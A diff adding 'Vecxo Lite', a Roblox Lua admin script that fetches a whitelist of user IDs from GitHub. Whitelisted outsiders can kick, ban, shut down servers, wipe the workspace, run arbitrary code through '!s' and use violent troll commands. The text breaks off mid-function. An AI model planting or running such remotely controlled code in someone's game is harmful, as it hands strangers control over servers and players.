@@ -1,0 +1,1798 @@
+--//VECXO LITE STARTS HERE
+
+local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
+local BackupIDs = {
+	-- cxo
+	3222470105;
+	7306448629;
+	21517314;
+	35950257;
+	-- tech
+	1702851506;
+	-- knocks
+	1551416114;
+	-- kozy
+	1889958;
+	-- decryptionite
+	120983992;
+	1921860822;
+	366631664;
+	13425405;
+	-- palamode
+	523322320;
+	-- freddie
+	1724769699;
+	--vecko
+	244903894;
+	36373784;
+}
+function GetWhitelist()
+	local returnedUsers = {}
+	local success, response = pcall(function()
+		return game:GetService("HttpService"):GetAsync(cxoURL)
+	end)
+	if success and response then
+		returnedUsers = string.split(response, "\n")
+	else
+		print("GitHub check failed! Using backup table.")
+		returnedUsers = BackupIDs
+	end
+	return returnedUsers
+end
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local whitelisted = GetWhitelist()
+local vecxoconnections = {}
+local bannedPlayers = {}
+local TweenService = game:GetService("TweenService")
+local ServerStorage = game:GetService("ServerStorage")
+local debrisProtectionRunning = false
+local mapBackup = Instance.new("Folder")
+mapBackup.Name = "MapBackup"
+mapBackup.Parent = ServerStorage
+
+local function notify(player, title, message)
+	coroutine.wrap(function()
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "AdminNotification"
+		gui.ResetOnSpawn = false
+		gui.IgnoreGuiInset = true
+		gui.Parent = player:FindFirstChildOfClass("PlayerGui")
+
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(0.4, 0, 0.2, 0)
+		frame.Position = UDim2.new(0.5, 0, 0.1, 0)
+		frame.AnchorPoint = Vector2.new(0.5, 0)
+		frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+		frame.BackgroundTransparency = 1
+		frame.BorderSizePixel = 0
+		frame.Parent = gui
+
+		local titleLabel = Instance.new("TextLabel")
+		titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+		titleLabel.Position = UDim2.new(0, 0, 0, 0)
+		titleLabel.BackgroundTransparency = 1
+		titleLabel.TextTransparency = 1
+		titleLabel.TextStrokeTransparency = 1
+		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+		titleLabel.Font = Enum.Font.Code
+		titleLabel.TextScaled = true
+		titleLabel.Text = title
+		titleLabel.Parent = frame
+
+		local messageLabel = Instance.new("TextLabel")
+		messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
+		messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
+		messageLabel.BackgroundTransparency = 1
+		messageLabel.TextTransparency = 1
+		messageLabel.TextStrokeTransparency = 1
+		messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+		messageLabel.Font = Enum.Font.Code
+		messageLabel.TextScaled = true
+		messageLabel.TextWrapped = true
+		messageLabel.Text = message
+		messageLabel.Parent = frame
+
+		local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+		TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
+		TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
+		TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
+
+		task.delay(5, function()
+			local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+			TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
+			TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
+			TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
+			task.wait(0.5)
+			gui:Destroy()
+		end)
+	end)()
+end
+
+local TweenService = game:GetService("TweenService")
+
+function notifyv2(player, title, message)
+	coroutine.wrap(function()
+		pcall(function()
+			local playerGui = player:WaitForChild("PlayerGui")
+
+			local screenGui = Instance.new("ScreenGui")
+			screenGui.Name = "VecxoHintGui"
+			screenGui.ResetOnSpawn = false
+			screenGui.Parent = playerGui
+
+
+			local frame = Instance.new("Frame")
+			frame.Size = UDim2.new(0, 300, 0, 80)
+			frame.AnchorPoint = Vector2.new(1, 1)
+			frame.Position = UDim2.new(1, -20, 1, -20)
+			frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			frame.BackgroundTransparency = 0.8
+			frame.BorderSizePixel = 0
+			frame.Parent = screenGui
+			frame.ClipsDescendants = true
+			frame.AutomaticSize = Enum.AutomaticSize.Y
+
+
+			local titleLabel = Instance.new("TextLabel")
+			titleLabel.Size = UDim2.new(1, -20, 0, 30)
+			titleLabel.Position = UDim2.new(0, 10, 0, 10)
+			titleLabel.BackgroundTransparency = 1
+			titleLabel.Text = title
+			titleLabel.Font = Enum.Font.GothamBold
+			titleLabel.TextSize = 20
+			titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+			titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+			titleLabel.Parent = frame
+
+			local messageLabel = Instance.new("TextLabel")
+			messageLabel.Size = UDim2.new(1, -20, 0, 40)
+			messageLabel.Position = UDim2.new(0, 10, 0, 40)
+			messageLabel.BackgroundTransparency = 1
+			messageLabel.Text = message
+			messageLabel.Font = Enum.Font.Gotham
+			messageLabel.TextSize = 16
+			messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
+			messageLabel.TextWrapped = true
+			messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+			messageLabel.TextYAlignment = Enum.TextYAlignment.Top
+			messageLabel.Parent = frame
+
+			frame.BackgroundTransparency = 1
+			titleLabel.TextTransparency = 1
+			messageLabel.TextTransparency = 1
+
+			local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+			local fadeInGoals = {
+				BackgroundTransparency = 0.8,
+			}
+			local fadeInTitleGoals = {
+				TextTransparency = 0,
+			}
+			local fadeInMessageGoals = {
+				TextTransparency = 0,
+			}
+
+			-- Create tweens
+			local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
+			local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
+			local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)
+
+			fadeInTween:Play()
+			fadeInTitleTween:Play()
+			fadeInMessageTween:Play()
+
+			fadeInTween.Completed:Wait()
+
+			task.wait(4)
+
+			local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
+			local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
+			local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})
+
+			fadeOutTween:Play()
+			fadeOutTitleTween:Play()
+			fadeOutMessageTween:Play()
+
+			fadeOutTween.Completed:Wait()
+
+			screenGui:Destroy()
+		end)
+	end)()
+end
+
+function GetPlayers(target, me)
+	local check4 = false
+	local ps = game.Players:GetPlayers()
+	local found = {}
+	if target == nil then
+		check4 = true
+		table.insert(found, me)
+	end
+	if check4 == false and check4 ~= true then
+		if target:lower() == "me" then
+			found = {me}
+		elseif target:lower() == "others" then
+			for i, player in ipairs(ps) do
+				if player ~= me then
+					table.insert(found, player)
+				end
+			end
+		elseif target:lower() == "friends" then
+			for i, player in ipairs(ps) do
+				if player ~= me and player:IsFriendsWith(me.UserId) then
+					table.insert(found, player)
+				end
+			end
+		elseif target:lower() == "all" then
+			found = ps
+		elseif target:lower() == "random" then
+			if #ps > 0 then
+				found = {ps[math.random(1, #ps)]}
+			end
+		else
+			for i, player in ipairs(ps) do
+				if player.Name:lower():sub(1, #target) == target:lower() or player.DisplayName:lower():sub(1, #target) == target:lower() then
+					table.insert(found, player)
+				end
+			end
+		end
+	end
+	return found
+end
+
+local serverprotection = false
+local warnings = {}
+local playerConnections = {}
+
+local dangerousKeywords = {
+	"kill all", "kill others", "punish all", "punish others",
+	"fling all", "fling others", "rocket all", "rocket others",
+	"kill/all", "kill/others", "rocket/all", "rocket/others", "explode all", "explode others", "explode/all",  "explode/others"
+}
+
+local function containsDangerousPhrase(message)
+	message = message:lower()
+	for _, phrase in ipairs(dangerousKeywords) do
+		if string.find(message, phrase, 1, true) then
+			return true
+		end
+	end
+	return false
+end
+
+local function warnPlayer(player)
+	local userId = player.UserId
+	local count = warnings[userId] or 0
+	count += 1
+	warnings[userId] = count
+
+	if count == 1 then
+		notify(player,"[Vecxo Lite]:", "Server protection is on\nYou are on your 1st warning. If you hit three, you will be automatically removed from the server.")
+	else
+		if count == 2 then
+			notify(player,"[Vecxo Lite]:", "Server protection is on\nYou are on your 2nd warning. One more strike for abuse, you will be automatically removed from the server.")		
+		end
+	end
+	if count >= 3 then
+		local message = Instance.new("Hint", workspace)
+		message.Text = "[Vecxo Lite]: Server protection automatically banned "..player.Name.." for abusing, three strikes were counted."
+		player:Kick("[BANNED] by Vecxo's admin for\nYou have been banned for repeated use of harmful commands.")
+		bannedPlayers[player.UserId] = true
+		task.spawn(function()
+			task.wait(7)
+			message:Destroy()
+		end)
+	end
+end
+
+local function onPlayerChatted(player, message)
+	if not serverprotection then return end
+	if containsDangerousPhrase(message) then
+		warnPlayer(player)
+	end
+end
+
+local function setupPlayer(player)
+	if playerConnections[player.UserId] then
+		playerConnections[player.UserId]:Disconnect()
+	end
+	playerConnections[player.UserId] = player.Chatted:Connect(function(message)
+		onPlayerChatted(player, message)
+	end)
+end
+
+local function cleanupConnections()
+	for userId, conn in pairs(playerConnections) do
+		if conn then
+			conn:Disconnect()
+		end
+	end
+	playerConnections = {}
+end
+
+local function refreshPlayer(plr)
+	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+		local rnpos = plr.Character.HumanoidRootPart.CFrame
+
+		for _, v in ipairs(plr.Character:GetChildren()) do
+			if v:IsA("Accessory") then
+				pcall(function()
+					v:Destroy()
+				end)
+			end
+		end
+
+		for _, item in ipairs(workspace:GetDescendants()) do
+			if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
+				if item.Name == plr.Name or item.Handle.Name == plr.Name then
+					pcall(function()
+						item:Destroy()
+					end)
+				end
+			end
+		end
+
+		plr:LoadCharacter()
+		task.wait()
+		if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+			plr.Character.HumanoidRootPart.CFrame = rnpos
+		end
+	else
+		plr:LoadCharacter()
+	end
+end
+
+local function showCommandGui(player)
+	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoCmds") then
+		player.PlayerGui.VecxoCmds:Destroy()
+	end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "VecxoCmds"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0, 400, 0, 300)
+	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+	frame.Active = true
+	frame.Draggable = true
+
+	local uicorner = Instance.new("UICorner", frame)
+	uicorner.CornerRadius = UDim.new(0, 8)
+
+	local title = Instance.new("TextLabel")
+	title.Text = "[Vecxo Lite]: Commands List"
+	title.Size = UDim2.new(1, 0, 0, 30)
+	title.BackgroundTransparency = 1
+	title.TextColor3 = Color3.new(1, 1, 1)
+	title.Font = Enum.Font.Code
+	title.TextSize = 18
+	title.Parent = frame
+
+	local closeBtn = Instance.new("TextButton")
+	closeBtn.Size = UDim2.new(0, 30, 0, 30)
+	closeBtn.Position = UDim2.new(1, -35, 0, 0)
+	closeBtn.Text = "X"
+	closeBtn.BackgroundTransparency = 0.2
+	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+	closeBtn.TextColor3 = Color3.new(1, 1, 1)
+	closeBtn.Font = Enum.Font.Gotham
+	closeBtn.TextSize = 14
+	closeBtn.Parent = frame
+	closeBtn.MouseButton1Click:Connect(function()
+		gui:Destroy()
+	end)
+
+	local scrollingFrame = Instance.new("ScrollingFrame")
+	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
+	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
+	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+	scrollingFrame.ScrollBarThickness = 6
+	scrollingFrame.BackgroundTransparency = 0.1
+	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	scrollingFrame.BorderSizePixel = 0
+	scrollingFrame.Parent = frame
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 4)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = scrollingFrame
+
+	local commands = {
+		"1 - !kick <plr|all|others|random|friends> [reason]",
+		"2 - !ban <plr|all|others|random|friends> [reason]",
+		"3 - !unban <plr|all|others|random|friends>",
+		"4 - !h <message>",
+		"5 - !rj <plr|all|others|random|friends>",
+		"6 - !wl <plr|all|others|random|friends>",
+		"7 - !unwl <plr|all|others|random|friends>",
+		"8 - !re <plr|all|others|random|friends>",
+		"9 - !hang <plr|all|others|random|friends>",
+		"10 - !crucify <plr|all|others|random|friends>",
+		"11 - !guil <plr|all|others|random|friends>",
+		"12 - !stickbeater <plr|all|others|random|friends>",
+		"13 - !knife <plr|all|others|random|friends>",
+		"14 - !magician <plr|all|others|random|friends>",
+		"15 - !bombvest <plr|all|others|random|friends>",
+		"16 - !toolgun <plr|all|others|random|friends>",
+		"17 - !gentk <plr|all|others|random|friends>",
+		"18 - !dex <plr|all|others|random|friends>",
+		"19 - !s <code>",
+		"20 - !clr - Cleans the server of junk",
+		"21 - !shutdown - Shuts the server down",
+		"22 - !wls - View whitelisted users in current server",
+		"23 - !bans - View banned players from the current server",
+		"24 - !backupmap - Backups the current map parts and stores them for later use",
+		"25 - !restoremap - Generates what was stored into !backupmap",
+		"26 - !hideobby - Hides the obby",
+		"27 - !unhideobby - Unhides the obby",
+		"28 - !unload - Unloads Vecxo Lite",
+		"29 - !reloadscript - Unloads and Reloads Vecxo Lite",
+		"30 - !gobby - Generates cool obby",
+		"31 - !serverprotection - <true/false>"
+		--"28 - !restart - Attempts to restart the server"
+
+	}
+
+	for _, text in ipairs(commands) do
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, -10, 0, 22)
+		label.BackgroundTransparency = 1
+		label.Text = text
+		label.TextColor3 = Color3.fromRGB(255, 255, 255)
+		label.TextXAlignment = Enum.TextXAlignment.Left
+		label.Font = Enum.Font.Gotham
+		label.TextSize = 14
+		label.Parent = scrollingFrame
+	end
+
+	task.defer(function()
+		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+	end)
+end
+
+local userNameCache = {}
+
+local function GetUserName(userId)
+	if userNameCache[userId] then
+		return userNameCache[userId]
+	end
+	local userIdNum = tonumber(userId)
+	if not userIdNum then return tostring(userId) end
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player.UserId == userIdNum then
+			userNameCache[userId] = player.Name
+			return player.Name
+		end
+	end
+	local success, result = pcall(function()
+		return Players:GetNameFromUserIdAsync(userIdNum)
+	end)
+	if success and result then
+		userNameCache[userId] = result
+		return result
+	end
+
+	return tostring(userId)
+end
+
+local function showWhitelisted(player, whitelistIds)
+	-- Destroy existing GUI if present
+	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoWhitelisted")
+	if existingGui then
+		existingGui:Destroy()
+	end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "VecxoWhitelisted"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0, 400, 0, 300)
+	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+	frame.Active = true
+	frame.Draggable = true
+
+	local uicorner = Instance.new("UICorner", frame)
+	uicorner.CornerRadius = UDim.new(0, 8)
+
+	local title = Instance.new("TextLabel")
+	title.Text = "[Vecxo Lite]: Whitelisted Players In-Game"
+	title.Size = UDim2.new(1, 0, 0, 30)
+	title.BackgroundTransparency = 1
+	title.TextColor3 = Color3.new(1, 1, 1)
+	title.Font = Enum.Font.Code
+	title.TextSize = 18
+	title.Parent = frame
+
+	local closeBtn = Instance.new("TextButton")
+	closeBtn.Size = UDim2.new(0, 30, 0, 30)
+	closeBtn.Position = UDim2.new(1, -35, 0, 0)
+	closeBtn.Text = "X"
+	closeBtn.BackgroundTransparency = 0.2
+	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+	closeBtn.TextColor3 = Color3.new(1, 1, 1)
+	closeBtn.Font = Enum.Font.Gotham
+	closeBtn.TextSize = 14
+	closeBtn.Parent = frame
+	closeBtn.MouseButton1Click:Connect(function()
+		gui:Destroy()
+	end)
+
+	local scrollingFrame = Instance.new("ScrollingFrame")
+	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
+	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
+	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+	scrollingFrame.ScrollBarThickness = 6
+	scrollingFrame.BackgroundTransparency = 0.1
+	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	scrollingFrame.BorderSizePixel = 0
+	scrollingFrame.Parent = frame
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 4)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = scrollingFrame
+
+	local inGameWhitelist = {}
+
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if table.find(whitelistIds, plr.UserId) or table.find(whitelistIds, tostring(plr.UserId)) then
+			table.insert(inGameWhitelist, plr)
+		end
+	end
+
+	if #inGameWhitelist == 0 then
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, -10, 0, 22)
+		label.BackgroundTransparency = 1
+		label.Text = "❌ No whitelisted players are currently in-game."
+		label.TextColor3 = Color3.fromRGB(255, 255, 255)
+		label.TextXAlignment = Enum.TextXAlignment.Left
+		label.Font = Enum.Font.Gotham
+		label.TextSize = 14
+		label.Parent = scrollingFrame
+	else
+		for i, plr in ipairs(inGameWhitelist) do
+			local label = Instance.new("TextLabel")
+			label.Size = UDim2.new(1, -10, 0, 22)
+			label.BackgroundTransparency = 1
+			label.Text = i .. " - [✅] " .. plr.Name .. " (" .. plr.UserId .. ")"
+			label.TextColor3 = Color3.fromRGB(255, 255, 255)
+			label.TextXAlignment = Enum.TextXAlignment.Left
+			label.Font = Enum.Font.Gotham
+			label.TextSize = 14
+			label.Parent = scrollingFrame
+		end
+	end
+
+	task.defer(function()
+		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+	end)
+end
+
+local function showBannedList(player, bannedPlayersTable)
+	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoBanned")
+	if existingGui then
+		existingGui:Destroy()
+	end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "VecxoBanned"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0, 400, 0, 300)
+	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+	frame.Active = true
+	frame.Draggable = true
+
+	local uicorner = Instance.new("UICorner", frame)
+	uicorner.CornerRadius = UDim.new(0, 8)
+
+	local title = Instance.new("TextLabel")
+	title.Text = "[Vecxo Lite]: Banned Players"
+	title.Size = UDim2.new(1, 0, 0, 30)
+	title.BackgroundTransparency = 1
+	title.TextColor3 = Color3.new(1, 1, 1)
+	title.Font = Enum.Font.Code
+	title.TextSize = 18
+	title.Parent = frame
+
+	local closeBtn = Instance.new("TextButton")
+	closeBtn.Size = UDim2.new(0, 30, 0, 30)
+	closeBtn.Position = UDim2.new(1, -35, 0, 0)
+	closeBtn.Text = "X"
+	closeBtn.BackgroundTransparency = 0.2
+	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+	closeBtn.TextColor3 = Color3.new(1, 1, 1)
+	closeBtn.Font = Enum.Font.Gotham
+	closeBtn.TextSize = 14
+	closeBtn.Parent = frame
+	closeBtn.MouseButton1Click:Connect(function()
+		gui:Destroy()
+	end)
+
+	local scrollingFrame = Instance.new("ScrollingFrame")
+	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
+	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
+	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+	scrollingFrame.ScrollBarThickness = 6
+	scrollingFrame.BackgroundTransparency = 0.1
+	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	scrollingFrame.BorderSizePixel = 0
+	scrollingFrame.Parent = frame
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 4)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = scrollingFrame
+
+	local bannedList = {}
+	for userIdStr, _ in pairs(bannedPlayersTable) do
+		local userIdNum = tonumber(userIdStr)
+		if userIdNum then
+			table.insert(bannedList, userIdNum)
+		end
+	end
+
+	if #bannedList == 0 then
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, -10, 0, 22)
+		label.BackgroundTransparency = 1
+		label.Text = "✅ No players are currently banned."
+		label.TextColor3 = Color3.fromRGB(255, 255, 255)
+		label.TextXAlignment = Enum.TextXAlignment.Left
+		label.Font = Enum.Font.Gotham
+		label.TextSize = 14
+		label.Parent = scrollingFrame
+	else
+		for i, userId in ipairs(bannedList) do
+			local name = GetUserName(userId)
+			local label = Instance.new("TextLabel")
+			label.Size = UDim2.new(1, -10, 0, 22)
+			label.BackgroundTransparency = 1
+			label.Text = i .. " - [🚫] " .. name .. " (" .. userId .. ")"
+			label.TextColor3 = Color3.fromRGB(255, 255, 255)
+			label.TextXAlignment = Enum.TextXAlignment.Left
+			label.Font = Enum.Font.Gotham
+			label.TextSize = 14
+			label.Parent = scrollingFrame
+		end
+	end
+
+	task.defer(function()
+		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+	end)
+end
+
+
+
+local function processCommand(sender, msg)
+	if not table.find(whitelisted, tostring(sender.UserId)) then return end
+	local args = msg:split(" ")
+	local cmd = args[1]:lower()
+	if cmd == "!wl" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+		for i, targetPlayer in ipairs(targets) do
+			if not table.find(whitelisted, tostring(targetPlayer.UserId)) then
+				table.insert(whitelisted, tostring(targetPlayer.UserId))
+			end
+			notify(sender, "[Vecxo Lite]:", "✅ Whitelisted " .. targetPlayer.Name)
+			notifyv2(targetPlayer, "[Vecxo Lite]:", "✅ You have been whitelisted. Usage: !cmds")
+		end
+
+	elseif cmd == "!unwl" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+		for _, targetPlayer in ipairs(targets) do
+			if targetPlayer.Name ~= "Reloxz" then
+				table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
+				notify(sender, "[Vecko Lite]: ", "✅ Removed " .. targetPlayer.Name .. " from whitelist")
+			else
+				notifyv2(sender, "[Vecko Lite]: ", "❌ Protected user cannot be removed from the whitelist")
+			end
+		end
+	elseif cmd == "!shutdown" then
+		for i, v in pairs(game.Players:GetPlayers()) do
+			v:Kick("[Vecxo Lite]: This server has been shutdown.")
+		end
+		game:Shutdown()
+	elseif cmd == "!wls" then
+		showWhitelisted(sender, whitelisted)
+	--[[elseif cmd == "!restart" then
+		local message = Instance.new("Message", workspace)
+		local dots = 0
+		local running = true
+		task.spawn(function()
+			while running do
+				dots = (dots % 3) + 1
+				message.Text = "[Vecxo Lite]: Restarting server" .. string.rep(".", dots)
+				task.wait(0.3)
+			end
+		end)
+		game.Players.PlayerAdded:Connect(function(v)
+			repeat task.wait() until v and v.Character
+			v:Kick("[Vecxo Lite]: This server was closed because someone triggered a new server creation.")
+		end)
+		local TeleportService = game:GetService("TeleportService")
+		local placeId = game.PlaceId
+		local allPlayers = game.Players:GetPlayers()
+
+		local success, err = pcall(function()
+			TeleportService:TeleportAsync(placeId, allPlayers)
+		end)
+		task.wait(7.5)
+		running = false
+		message:Destroy()
+		for _, v in ipairs(game.Players:GetPlayers()) do
+			v:Kick("[Vecxo Lite]: Failed to teleport you to the restarted server. Please rejoin manually, sorry :-(")
+		end]]
+	elseif cmd == "!hideobby" then
+		for i, v in pairs(game.workspace:GetDescendants()) do
+			if v.Name == "Tabby" then
+				for z, x in pairs(v:GetDescendants()) do
+					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
+						x.CanCollide = false
+						x.CanTouch = false
+						x.Transparency = 1
+					end
+				end
+			end
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is hidden successfully")
+	elseif cmd == "!unhideobby" then
+		for i, v in pairs(game.workspace:GetDescendants()) do
+			if v.Name == "Tabby" then
+				for z, x in pairs(v:GetDescendants()) do
+					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
+						x.CanCollide = true
+						x.CanTouch = true
+						if x.Name == "Barrier" then
+							x.Transparency = 0.6 
+						else
+							x.Transparency = 0
+						end
+					end
+				end
+			end
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is unhidden successfully")
+	elseif cmd == "!clr" then
+		for _, v in pairs(game.Workspace:GetChildren()) do
+			if (v:IsA("Part") or v:IsA("TrussPart") or v:IsA("WedgePart")) and v.Parent == game.Workspace then
+				v:Destroy()
+			end
+		end
+		for _, v in pairs(workspace:GetChildren()) do
+			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
+				v:Destroy()
+			end
+		end
+		for _, v in pairs(workspace:GetDescendants()) do
+			if v.Name ~= "face" and (v:IsA("Decal") or v:IsA("ParticleEmitter")) then
+				v:Destroy()
+			end
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Workspace cleared successfully")
+	elseif cmd == "!unload" then
+		local h = Instance.new("Hint", workspace)
+		for i = 3, 1, -1 do
+			h.Text = "[Vecxo Lite]: Unloading in ".. i .." seconds"
+			task.wait(1)
+		end
+		h:Destroy()
+		for i,v in pairs(vecxoconnections) do
+			if typeof(v) ~= "function" then
+				v:Disconnect()
+			end
+			vecxoconnections[i] = nil
+		end
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.PlayerGui then 
+				if v.PlayerGui:FindFirstChild("VecxoCmds") then
+					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
+				end
+				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
+					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
+				end
+				if v.PlayerGui:FindFirstChild("VecxoBanned") then
+					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
+				end
+			end
+		end
+		whitelisted = {}
+		bannedPlayers = {}
+		vecxoconnections = {}
+	elseif cmd == "!reloadscript" then
+		local h = Instance.new("Hint", workspace)
+		for i = 3, 1, -1 do
+			h.Text = "[Vecxo Lite]: - Reloading in [ ".. i .." ] seconds"
+			task.wait(1)
+		end
+		h:Destroy()
+		for i,v in pairs(vecxoconnections) do
+			if typeof(v) ~= "function" then
+				v:Disconnect()
+			end
+			vecxoconnections[i] = nil
+		end
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.PlayerGui then 
+				if v.PlayerGui:FindFirstChild("VecxoCmds") then
+					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
+				end
+				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
+					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
+				end
+				if v.PlayerGui:FindFirstChild("VecxoBanned") then
+					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
+				end
+			end
+		end
+		whitelisted = {}
+		bannedPlayers = {}
+		vecxoconnections = {}
+		local h2 = Instance.new("Hint", workspace)
+		h2.Text = "[Vecxo Lite]: - Unloaded successfully"
+		task.wait(1)
+		h2:Destroy()
+		local message = Instance.new("Hint", workspace)
+		local dots = 0
+		local running = true
+		local check = false
+		task.spawn(function()
+			while running do
+				dots = (dots % 3) + 1
+				message.Text = "[Vecxo Lite]: - Attempting to automatically reload" .. string.rep(".", dots)
+				task.wait(0.3)
+			end
+		end)
+		task.wait(.7)
+		local httpService = game:GetService("HttpService")
